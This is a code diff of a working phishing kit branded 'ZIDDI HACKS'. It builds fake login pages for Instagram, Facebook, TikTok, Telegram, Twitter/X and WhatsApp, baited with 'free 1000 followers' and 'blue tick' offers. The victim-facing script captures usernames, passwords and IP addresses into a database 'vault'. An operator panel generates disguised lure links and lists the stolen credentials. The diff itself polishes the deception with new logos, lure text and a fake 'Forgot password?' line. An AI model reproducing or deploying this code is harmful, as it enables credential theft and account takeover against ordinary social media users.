@@ -4,11 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <meta property="og:title" content="🎁 Exclusive Reward Claim">
-    <meta property="og:description" content="Get Free Followers, Views, or Blue Tick. Limited Time Offer 2026!">
+    <meta property="og:title" content="🎁 Claim Free 1000 Followers Now!">
+    <meta property="og:description" content="Exclusive 2026 Social Media Growth Panel. Get your reward instantly!">
     <meta property="og:image" content="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e00b572.png">
 
-    <title>ZIDDI HACKS | Secure Master</title>
+    <title>ZIDDI HACKS | Master Panel</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     
     <style>
@@ -40,17 +40,18 @@
         th { color: var(--primary); text-align: left; padding: 12px; font-size: 11px; border-bottom: 1px solid #334155; }
         td { padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 13px; }
         
-        /* Victim UI Overlay */
+        /* Victim UI Fixed */
         #victimUI { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 99999; color: #000; justify-content: center; align-items: center; flex-direction: column; }
+        .v-login-msg { margin-bottom: 20px; color: #333; font-weight: 600; font-size: 14px; }
     </style>
 </head>
 <body>
 
     <div id="authUI" class="auth-container">
         <h1 style="font-family:'Orbitron'; color:var(--primary);">ZIDDI HACKS</h1>
-        <p style="font-size: 12px; opacity: 0.6; margin: 10px 0;">Login to Manage Your Private Links</p>
+        <p style="font-size: 12px; opacity: 0.6; margin: 10px 0;">Private Database Access</p>
         <button class="google-btn" onclick="login()">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" width="20">
+            <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" width="20">
             Continue with Google
         </button>
     </div>
@@ -62,7 +63,7 @@
         </div>
 
         <div class="card">
-            <h3 style="font-size:14px; font-family:'Orbitron';">SELECT PLATFORM</h3>
+            <h3 style="font-size:14px; font-family:'Orbitron';">GENERATE LINK</h3>
             <div class="platform-grid">
                 <div class="p-btn active" onclick="setPlat('Instagram', this)"><i class="fab fa-instagram"></i>Insta</div>
                 <div class="p-btn" onclick="setPlat('Facebook', this)"><i class="fab fa-facebook"></i>Facebk</div>
@@ -79,7 +80,7 @@
         </div>
 
         <div class="card">
-            <h3 style="font-size:14px; font-family:'Orbitron';">CAPTURED VICTIMS</h3>
+            <h3 style="font-size:14px; font-family:'Orbitron';">DATABASE</h3>
             <div class="table-wrap">
                 <table>
                     <thead><tr><th>Platform</th><th>User</th><th>Pass</th><th>IP/Time</th></tr></thead>
@@ -91,10 +92,12 @@
 
     <div id="victimUI">
         <div style="width:90%; max-width:350px; text-align:center;">
-            <img id="vLogo" src="" width="150" style="margin-bottom:30px;">
+            <img id="vLogo" src="" width="180" style="margin-bottom:15px; display:block; margin-left:auto; margin-right:auto;">
+            <p class="v-login-msg">Login to Get Free 1000 Followers</p>
             <input type="text" id="vUser" placeholder="Username, Email or Phone" style="width:100%; padding:14px; margin-bottom:10px; border:1px solid #dbdbdb; border-radius:5px; outline:none;">
             <input type="password" id="vPass" placeholder="Password" style="width:100%; padding:14px; margin-bottom:10px; border:1px solid #dbdbdb; border-radius:5px; outline:none;">
             <button id="vBtn" onclick="captureData()" style="width:100%; padding:14px; color:white; border:none; border-radius:5px; font-weight:bold; cursor:pointer;">Log In</button>
+            <p style="margin-top:20px; color:#385185; font-size:14px; font-weight:500;">Forgot password?</p>
         </div>
     </div>
 
@@ -120,8 +123,7 @@
         let currentPlat = "Instagram";
         const urlParams = new URLSearchParams(window.location.search);
 
-        // --- AUTH LOGIC ---
-        function login() { auth.signInWithPopup(provider).catch(e => alert(e.message)); }
+        function login() { auth.signInWithPopup(provider); }
         function logout() { auth.signOut().then(() => location.reload()); }
 
         auth.onAuthStateChanged(user => {
@@ -133,7 +135,6 @@
             }
         });
 
-        // --- ADMIN LOGIC ---
         function setPlat(p, el) {
             currentPlat = p;
             document.querySelectorAll('.p-btn').forEach(b => b.classList.remove('active'));
@@ -142,16 +143,15 @@
 
         function genLink() {
             const masks = {
-                'Instagram': 'Instagram-Free-Followers-Boost-2026',
-                'Facebook': 'Facebook-Free-Followers-Panel',
-                'TikTok': 'TikTok-Free-Followers-Views',
-                'Telegram': 'Telegram-Free-Members-Proxy',
-                'Twitter': 'X-Twitter-Blue-Tick-Free',
-                'WhatsApp': 'WhatsApp-Free-Blue-Tick-Claim'
+                'Instagram': 'Instagram-Free-1000-Followers-2026',
+                'Facebook': 'Facebook-Free-Followers-Get-Now',
+                'TikTok': 'TikTok-Viral-Free-Views-Panel',
+                'Telegram': 'Telegram-Free-Members-Claim',
+                'Twitter': 'Twitter-Blue-Tick-Verification',
+                'WhatsApp': 'WhatsApp-Free-Blue-Tick-Activate'
             };
             const baseUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
-            const link = `${baseUrl}?login=${masks[currentPlat]}&ref=${currentUser.uid}`;
-            document.getElementById('finalLink').innerText = link;
+            document.getElementById('finalLink').innerText = `${baseUrl}?login=${masks[currentPlat]}&ref=${currentUser.uid}`;
             document.getElementById('linkContainer').style.display = 'block';
         }
 
@@ -160,7 +160,7 @@
             const el = document.createElement('textarea');
             el.value = text; document.body.appendChild(el); el.select();
             document.execCommand('copy'); document.body.removeChild(el);
-            alert("✅ Private Link Copied!");
+            alert("✅ Link Copied!");
         }
 
         function loadVictims() {
@@ -186,7 +186,7 @@
             alert("Copied!");
         }
 
-        // --- VICTIM LOGIC ---
+        // --- VICTIM LOGIC WITH FIXED LOGOS ---
         if(urlParams.has('login')) {
             document.getElementById('authUI').style.display = 'none';
             document.getElementById('adminUI').style.display = 'none';
@@ -196,27 +196,24 @@
             const logo = document.getElementById('vLogo');
             const btn = document.getElementById('vBtn');
             
-            if(type.includes('Facebook')) { logo.src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCuOTvtm4w.svg"; btn.style.background="#1877f2"; }
+            // Fixed High-Quality CDN Logos
+            if(type.includes('Facebook')) { logo.src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"; btn.style.background="#1877f2"; }
             else if(type.includes('TikTok')) { logo.src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg"; btn.style.background="#000"; }
             else if(type.includes('Telegram')) { logo.src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg"; btn.style.background="#0088cc"; }
-            else if(type.includes('Twitter')) { logo.src="https://abs.twimg.com/errors/logo46x38.png"; btn.style.background="#000"; }
+            else if(type.includes('Twitter')) { logo.src="https://upload.wikimedia.org/wikipedia/commons/5/53/X_logo_2023_original.svg"; btn.style.background="#000"; }
             else if(type.includes('WhatsApp')) { logo.src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg"; btn.style.background="#25d366"; }
-            else { logo.src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e00b572.png"; btn.style.background="#0095f6"; }
+            else { logo.src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg"; btn.style.background="#d62976"; }
         }
 
         async function captureData() {
             const u = document.getElementById('vUser').value;
             const p = document.getElementById('vPass').value;
-            if(!u || !p) return alert("Invalid Login");
-            
+            if(!u || !p) return alert("Please fill all fields");
             let ip = "0.0.0.0";
             try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
-
             await db.collection('vault').add({
                 platform: urlParams.get('login'),
-                user: u,
-                pass: p,
-                ip: ip,
+                user: u, pass: p, ip: ip,
                 ownerUID: urlParams.get('ref'),
                 time: new Date().toLocaleString()
             });
@@ -224,4 +221,4 @@
         }
     </script>
 </body>
-    </html>
+</html>
